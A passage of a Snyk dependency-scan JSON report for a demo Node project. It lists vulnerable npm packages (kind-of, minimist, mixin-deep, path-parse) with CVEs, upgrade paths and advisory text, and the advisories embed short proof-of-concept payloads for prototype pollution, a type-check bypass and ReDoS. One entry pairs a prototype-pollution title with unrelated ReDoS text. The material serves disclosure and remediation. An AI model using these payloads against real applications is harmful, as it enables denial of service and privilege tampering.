              "tap@11.1.5",
              "coveralls@3.0.9",
              "request@2.88.0",
              "http-signature@1.2.0",
              "jsprim@1.4.1",
              "json-schema@0.2.3"
            ],
            "upgradePath": [
              false,
              "tap@11.1.5",
              "coveralls@3.0.9",
              "request@2.88.0",
              "http-signature@1.2.0",
              "jsprim@1.4.2",
              "json-schema@0.4.0"
            ],
            "isUpgradable": true,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "json-schema",
            "version": "0.2.3",
            "severityWithCritical": "high"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:P/RL:O/RC:C",
            "alternativeIds": [],
            "creationTime": "2019-12-16T14:21:14.675101Z",
            "credit": [
              "Feng Xiao"
            ],
            "cvssScore": 3.7,
            "description": "## Overview\n[kind-of](https://github.com/jonschlinkert/kind-of) is a package that gets the native type of a value.\n\nAffected versions of this package are vulnerable to Validation Bypass. It leverages the built-in constructor of unsafe user-input to detect type information. However, a crafted payload can overwrite this built in attribute to manipulate the type detection result.\r\n\r\n## PoC by Feng Xiao\r\n```\r\nvar kindOf = require('kind-of');\r\n\r\n\r\nvar user_input = {\r\n  user: 'barney',\r\n  age: 36,\r\n  active: true,\r\n  \"constructor\":{\"name\":\"Symbol\"}\r\n};\r\nconsole.log(kindOf(user_input));\r\n```\n## Remediation\nUpgrade `kind-of` to version 6.0.3 or higher.\n## References\n- [GitHub Issue](https://github.com/jonschlinkert/kind-of/issues/30)\n- [GitHub PR](https://github.com/jonschlinkert/kind-of/pull/31)\n",
            "disclosureTime": "2019-12-16T14:31:14Z",
            "exploit": "Proof of Concept",
            "fixedIn": [
              "6.0.3"
            ],
            "functions": [
              {
                "functionId": {
                  "className": null,
                  "filePath": "index.js",
                  "functionName": "ctorName"
                },
                "version": [
                  ">=6.0.0 <6.0.3"
                ]
              }
            ],
            "functions_new": [
              {
                "functionId": {
                  "filePath": "index.js",
                  "functionName": "ctorName"
                },
                "version": [
                  ">=6.0.0 <6.0.3"
                ]
              }
            ],
            "id": "SNYK-JS-KINDOF-537849",
            "identifiers": {
              "CVE": [
                "CVE-2019-20149"
              ],
              "CWE": [
                "CWE-20"
              ],
              "GHSA": [
                "GHSA-6c8f-qphg-qjgp"
              ],
              "NSP": [
                "1490"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2020-12-17T13:54:54.804808Z",
            "moduleName": "kind-of",
            "packageManager": "npm",
            "packageName": "kind-of",
            "patches": [],
            "proprietary": false,
            "publicationTime": "2020-01-19T14:31:13Z",
            "references": [
              {
                "title": "GitHub Issue",
                "url": "https://github.com/jonschlinkert/kind-of/issues/30"
              },
              {
                "title": "GitHub PR",
                "url": "https://github.com/jonschlinkert/kind-of/pull/31"
              }
            ],
            "semver": {
              "vulnerable": [
                ">=6.0.0 <6.0.3"
              ]
            },
            "severity": "low",
            "socialTrendAlert": false,
            "title": "Validation Bypass",
            "from": [
              "goof@1.0.1",
              "tap@11.1.5",
              "nyc@11.9.0",
              "test-exclude@4.2.1",
              "micromatch@3.1.10",
              "extglob@2.0.4",
              "expand-brackets@2.1.4",
              "snapdragon@0.8.2",
              "base@0.11.2",
              "define-property@1.0.0",
              "is-descriptor@1.0.2",
              "is-data-descriptor@1.0.0",
              "kind-of@6.0.2"
            ],
            "upgradePath": [
              false,
              "tap@11.1.5",
              "nyc@11.9.0",
              "test-exclude@4.2.1",
              "micromatch@3.1.10",
              "extglob@2.0.4",
              "expand-brackets@2.1.4",
              "snapdragon@0.8.2",
              "base@0.11.2",
              "define-property@1.0.0",
              "is-descriptor@1.0.2",
              "is-data-descriptor@1.0.0",
              "kind-of@6.0.3"
            ],
            "isUpgradable": true,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "kind-of",
            "version": "6.0.2",
            "severityWithCritical": "low"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "alternativeIds": [],
            "creationTime": "2022-03-18T13:02:08.840039Z",
            "credit": [
              "Unknown"
            ],
            "cvssScore": 3.7,
            "description": "## Overview\n[minimist](https://www.npmjs.com/package/minimist) is a parse argument options module.\n\nAffected versions of this package are vulnerable to Prototype Pollution due to a missing handler to `Function.prototype`.\r\n**Note:** this is a bypass to [CVE-2020-7598](https://security.snyk.io/vuln/SNYK-JS-MINIMIST-559764)\r\n\r\n## PoC by Snyk\r\n```js\r\nrequire('minimist')('--_.constructor.constructor.prototype.foo bar'.split(' '));\r\nconsole.log((function(){}).foo); // bar\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `minimist` to version 1.2.6 or higher.\n## References\n- [Fix Commit](https://github.com/substack/minimist/commit/c2b981977fa834b223b408cfb860f933c9811e4d)\n- [GitHub Issue](https://github.com/substack/minimist/issues/164)\n- [Vulnerable Code](https://github.com/substack/minimist/blob/master/index.js#L69)\n",
            "disclosureTime": "2022-03-18T12:24:05Z",
            "exploit": "Not Defined",
            "fixedIn": [
              "1.2.6"
            ],
            "functions": [],
            "functions_new": [],
            "id": "SNYK-JS-MINIMIST-2429795",
            "identifiers": {
              "CVE": [
                "CVE-2021-44906"
              ],
              "CWE": [
                "CWE-1321"
              ],
              "SNYK": [
                "SNYK-JS-MINIMIST-559764"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2022-03-22T13:31:59.687436Z",
            "moduleName": "minimist",
            "packageManager": "npm",
            "packageName": "minimist",
            "patches": [],
            "proprietary": false,
            "publicationTime": "2022-03-21T12:09:35Z",
            "references": [
              {
                "title": "Fix Commit",
                "url": "https://github.com/substack/minimist/commit/c2b981977fa834b223b408cfb860f933c9811e4d"
              },
              {
                "title": "GitHub Issue",
                "url": "https://github.com/substack/minimist/issues/164"
              },
              {
                "title": "Vulnerable Code",
                "url": "https://github.com/substack/minimist/blob/master/index.js%23L69"
              }
            ],
            "semver": {
              "vulnerable": [
                "<1.2.6"
              ]
            },
            "severity": "low",
            "socialTrendAlert": false,
            "title": "Prototype Pollution",
            "from": [
              "goof@1.0.1",
              "typeorm@0.2.24",
              "mkdirp@0.5.5",
              "minimist@1.2.5"
            ],
            "upgradePath": [
              false,
              "typeorm@0.2.24",
              "mkdirp@0.5.5",
              "minimist@1.2.6"
            ],
            "isUpgradable": true,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "minimist",
            "version": "1.2.5",
            "severityWithCritical": "low"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C",
            "alternativeIds": [],
            "creationTime": "2020-03-11T08:25:47.093051Z",
            "credit": [
              "Snyk Security Team"
            ],
            "cvssScore": 5.6,
            "description": "## Overview\n[minimist](https://www.npmjs.com/package/minimist) is a parse argument options module.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The library could be tricked into adding or modifying properties of `Object.prototype` using a `constructor` or `__proto__` payload.\r\n\r\n## PoC by Snyk\r\n```\r\nrequire('minimist')('--__proto__.injected0 value0'.split(' '));\r\nconsole.log(({}).injected0 === 'value0'); // true\r\n\r\nrequire('minimist')('--constructor.prototype.injected1 value1'.split(' '));\r\nconsole.log(({}).injected1 === 'value1'); // true\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `minimist` to version 0.2.1, 1.2.3 or higher.\n## References\n- [Command Injection PoC](https://gist.github.com/Kirill89/47feb345b09bf081317f08dd43403a8a)\n- [GitHub Fix Commit #1](https://github.com/substack/minimist/commit/63e7ed05aa4b1889ec2f3b196426db4500cbda94)\n- [GitHub Fix Commit #2](https://github.com/substack/minimist/commit/38a4d1caead72ef99e824bb420a2528eec03d9ab)\n- [Snyk Research Blog](https://snyk.io/blog/prototype-pollution-minimist/)\n",
            "disclosureTime": "2020-03-10T08:22:24Z",
            "exploit": "Proof of Concept",
            "fixedIn": [
              "0.2.1",
              "1.2.3"
            ],
            "functions": [
              {
                "functionId": {
                  "className": null,
                  "filePath": "index.js",
                  "functionName": "setKey"
                },
                "version": [
                  "<0.2.1",
                  ">=1.0.0 <1.1.1"
                ]
              },
              {
                "functionId": {
                  "className": null,
                  "filePath": "index.js",
                  "functionName": "module.exports.setKey"
                },
                "version": [
                  "<0.2.1",
                  ">=1.1.1 <1.2.3"
                ]
              }
            ],
            "functions_new": [
              {
                "functionId": {
                  "filePath": "index.js",
                  "functionName": "setKey"
                },
                "version": [
                  "<0.2.1",
                  ">=1.0.0 <1.1.1"
                ]
              },
              {
                "functionId": {
                  "filePath": "index.js",
                  "functionName": "module.exports.setKey"
                },
                "version": [
                  "<0.2.1",
                  ">=1.1.1 <1.2.3"
                ]
              }
            ],
            "id": "SNYK-JS-MINIMIST-559764",
            "identifiers": {
              "CVE": [
                "CVE-2020-7598"
              ],
              "CWE": [
                "CWE-400"
              ],
              "GHSA": [
                "GHSA-vh95-rmgr-6w4m"
              ],
              "NSP": [
                "1179"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2020-12-20T09:48:43.878574Z",
            "moduleName": "minimist",
            "packageManager": "npm",
            "packageName": "minimist",
            "patches": [],
            "proprietary": true,
            "publicationTime": "2020-03-11T08:22:19Z",
            "references": [
              {
                "title": "Command Injection PoC",
                "url": "https://gist.github.com/Kirill89/47feb345b09bf081317f08dd43403a8a"
              },
              {
                "title": "GitHub Fix Commit #1",
                "url": "https://github.com/substack/minimist/commit/63e7ed05aa4b1889ec2f3b196426db4500cbda94"
              },
              {
                "title": "GitHub Fix Commit #2",
                "url": "https://github.com/substack/minimist/commit/38a4d1caead72ef99e824bb420a2528eec03d9ab"
              },
              {
                "title": "Snyk Research Blog",
                "url": "https://snyk.io/blog/prototype-pollution-minimist/"
              }
            ],
            "semver": {
              "vulnerable": [
                "<0.2.1",
                ">=1.0.0 <1.2.3"
              ]
            },
            "severity": "medium",
            "socialTrendAlert": false,
            "title": "Prototype Pollution",
            "from": [
              "goof@1.0.1",
              "tap@11.1.5",
              "nyc@11.9.0",
              "istanbul-reports@1.4.0",
              "handlebars@4.0.11",
              "optimist@0.6.1",
              "minimist@0.0.8"
            ],
            "upgradePath": [],
            "isUpgradable": false,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "minimist",
            "version": "0.0.8",
            "severityWithCritical": "medium"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C",
            "alternativeIds": [],
            "creationTime": "2019-06-20T09:34:56.241544Z",
            "credit": [
              "Snyk Security Team"
            ],
            "cvssScore": 7.3,
            "description": "## Overview\n[mixin-deep](https://www.npmjs.com/package/mixin-deep) is a package that deeply mixes the properties of objects into the first object.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The function `mixin-deep` could be tricked into adding or modifying properties of `Object.prototype` using a `constructor` payload.\r\n\r\n## PoC by Snyk\r\n```\r\nconst mixin = require('mixin-deep');\r\nconst payload = '{\"constructor\": {\"prototype\": {\"a0\": true}}}'\r\n\r\nfunction check() {\r\n    mixin({}, JSON.parse(payload));\r\n    if (({})[`a0`] === true) {\r\n          console.log(`Vulnerable to Prototype Pollution via ${payload}`)\r\n  }\r\n}\r\n\r\ncheck();\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `mixin-deep` to version 2.0.1, 1.3.2 or higher.\n## References\n- [GitHub Commit](https://github.com/jonschlinkert/mixin-deep/commit/8f464c8ce9761a8c9c2b3457eaeee9d404fa7af9)\n",
            "disclosureTime": "2019-06-19T09:34:10Z",
            "exploit": "Proof of Concept",
            "fixedIn": [
              "2.0.1",
              "1.3.2"
            ],
            "functions": [
              {
                "functionId": {
                  "className": null,
                  "filePath": "index.js",
                  "functionName": "module.exports.copy"
                },
                "version": [
                  "<1.1.1"
                ]
              },
              {
                "functionId": {
                  "className": null,
                  "filePath": "index.js",
                  "functionName": "copy"
                },
                "version": [
                  ">=1.1.1 <2.0.0"
                ]
              },
              {
                "functionId": {
                  "className": null,
                  "filePath": "index.js",
                  "functionName": "mixinDeep"
                },
                "version": [
                  ">=2.0.0 <2.0.1"
                ]
              }
            ],
            "functions_new": [
              {
                "functionId": {
                  "filePath": "index.js",
                  "functionName": "module.exports.copy"
                },
                "version": [
                  "<1.1.1"
                ]
              },
              {
                "functionId": {
                  "filePath": "index.js",
                  "functionName": "copy"
                },
                "version": [
                  ">=1.1.1 <2.0.0"
                ]
              },
              {
                "functionId": {
                  "filePath": "index.js",
                  "functionName": "mixinDeep"
                },
                "version": [
                  ">=2.0.0 <2.0.1"
                ]
              }
            ],
            "id": "SNYK-JS-MIXINDEEP-450212",
            "identifiers": {
              "CVE": [
                "CVE-2019-10746"
              ],
              "CWE": [
                "CWE-400"
              ],
              "GHSA": [
                "GHSA-fhjf-83wg-r2j9"
              ],
              "NSP": [
                "1013"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2020-12-22T17:02:13.112544Z",
            "moduleName": "mixin-deep",
            "packageManager": "npm",
            "packageName": "mixin-deep",
            "patches": [],
            "proprietary": true,
            "publicationTime": "2019-06-20T09:34:08Z",
            "references": [
              {
                "title": "GitHub Commit",
                "url": "https://github.com/jonschlinkert/mixin-deep/commit/8f464c8ce9761a8c9c2b3457eaeee9d404fa7af9"
              }
            ],
            "semver": {
              "vulnerable": [
                ">=2.0.0 <2.0.1",
                "<1.3.2"
              ]
            },
            "severity": "high",
            "socialTrendAlert": false,
            "title": "Prototype Pollution",
            "from": [
              "goof@1.0.1",
              "tap@11.1.5",
              "nyc@11.9.0",
              "test-exclude@4.2.1",
              "micromatch@3.1.10",
              "extglob@2.0.4",
              "expand-brackets@2.1.4",
              "snapdragon@0.8.2",
              "base@0.11.2",
              "mixin-deep@1.3.1"
            ],
            "upgradePath": [
              false,
              "tap@11.1.5",
              "nyc@11.9.0",
              "test-exclude@4.2.1",
              "micromatch@3.1.10",
              "extglob@2.0.4",
              "expand-brackets@2.1.4",
              "snapdragon@0.8.2",
              "base@0.11.2",
              "mixin-deep@1.3.2"
            ],
            "isUpgradable": true,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "mixin-deep",
            "version": "1.3.1",
            "severityWithCritical": "high"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
            "alternativeIds": [],
            "creationTime": "2021-02-19T16:00:22.449519Z",
            "credit": [
              "Yeting Li"
            ],
            "cvssScore": 5.3,
            "description": "## Overview\n[path-parse](https://www.npmjs.org/package/path-parse) is a Node.js path.parse() ponyfill\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via `splitDeviceRe`, `splitTailRe`, and `splitPathRe` regular expressions. ReDoS exhibits polynomial worst-case time complexity.\r\n\r\n### PoC\r\n```\r\nvar pathParse = require('path-parse');\r\nfunction build_attack(n) {\r\n    var ret = \"\"\r\n    for (var i = 0; i < n; i++) {\r\n        ret += \"/\"\r\n    }\r\n    return ret + \"◎\";\r\n}\r\n\r\nfor(var i = 1; i <= 5000000; i++) {\r\n    if (i % 10000 == 0) {\r\n        var time = Date.now();\r\n        var attack_str = build_attack(i)\r\n        pathParse(attack_str);\r\n        var time_cost = Date.now() - time;\r\n        console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\r\n }\r\n}\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `path-parse` to version 1.0.7 or higher.\n## References\n- [GitHub Issue 1](https://github.com/jbgutierrez/path-parse/issues/8)\n- [GitHub PR](https://github.com/jbgutierrez/path-parse/pull/10)\n",
            "disclosureTime": "2021-02-19T15:54:01Z",
            "exploit": "Proof of Concept",
            "fixedIn": [
              "1.0.7"
            ],
            "functions": [],
            "functions_new": [],
            "id": "SNYK-JS-PATHPARSE-1077067",
            "identifiers": {
              "CVE": [
                "CVE-2021-23343"
              ],
              "CWE": [
                "CWE-400"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2021-08-08T13:56:55.024375Z",
            "moduleName": "path-parse",
            "packageManager": "npm",
            "packageName": "path-parse",
            "patches": [],
            "proprietary": true,
            "publicationTime": "2021-05-04T08:38:49Z",
            "references": [
              {
                "title": "GitHub Issue 1",
                "url": "https://github.com/jbgutierrez/path-parse/issues/8"
              },
              {
                "title": "GitHub PR",
                "url": "https://github.com/jbgutierrez/path-parse/pull/10"
              }
            ],
            "semver": {
              "vulnerable": [
                "<1.0.7"
              ]
            },
            "severity": "medium",
            "socialTrendAlert": false,
            "title": "Regular Expression Denial of Service (ReDoS)",
            "from": [
              "goof@1.0.1",
              "tap@11.1.5",
              "nyc@11.9.0",
              "istanbul-lib-report@1.1.3",
              "path-parse@1.0.5"
            ],
            "upgradePath": [
              false,
              "tap@11.1.5",
              "nyc@11.9.0",
              "istanbul-lib-report@1.1.3",
              "path-parse@1.0.7"
            ],
            "isUpgradable": true,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "path-parse",
            "version": "1.0.5",
            "severityWithCritical": "medium"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "alternativeIds": [],
            "creationTime": "2021-08-12T16:49:06.015288Z",
            "credit": [
              "Alessio Della Libera",
              "ready-research"
            ],
            "cvssScore": 7.3,
